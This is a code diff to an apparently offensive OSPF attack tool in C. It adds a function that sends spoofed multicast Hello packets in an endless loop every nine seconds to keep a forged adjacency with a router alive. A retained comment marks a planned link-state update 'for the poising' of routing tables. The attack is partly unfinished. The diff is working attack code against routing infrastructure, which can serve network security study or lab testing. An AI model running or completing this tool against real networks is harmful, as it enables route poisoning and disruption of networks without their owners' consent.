@@ -8,6 +8,7 @@
 #include <linux/if_ether.h>
 #include <netinet/ether.h>
 #include <netinet/ip.h>
+#include <unistd.h>
 
 #include "ospf.h"
 #include "ospf_attack.h"
@@ -79,11 +80,23 @@ void attack_establish_adjacency(struct attack_env *env) {
     }
   }
 
-  fprintf(stderr, "TODO: read seq number, dest mac and ip and reply with ack\n");
   // attack_send_ls_ack(env, dest_mac, dest_ip, seq_number);
-
   fprintf(stderr, "TODO: Send LS update for the poising\n");
-  fprintf(stderr, "TODO: Send hello indefinitely\n");
+}
+
+void attack_send_keepalive(struct attack_env *env) {
+  int ret_value;
+  fprintf(stderr, "SENDING LOTS OF HELLOS");
+
+  while (1) {
+    int packet_len = ospf_multicast_hello(env->buffer, env->local_mac, env->local_ip, env->router_ip);
+    fprintf(stderr, "- Sending multicast hello... ");
+    if((ret_value = send_packet(env->sock_fd, parse_mac_addr(IPV4_MULTICAST_MAC), env->buffer, env->iface_index, packet_len)) < 0) {
+      die("\nFATAL: Error sending Hello packet\n");
+    }
+    fprintf(stderr, "DONE (%d)\n", ret_value);
+    sleep(9);
+  }
 }
 
 void attack_sync_db_desc(struct attack_env *env) {
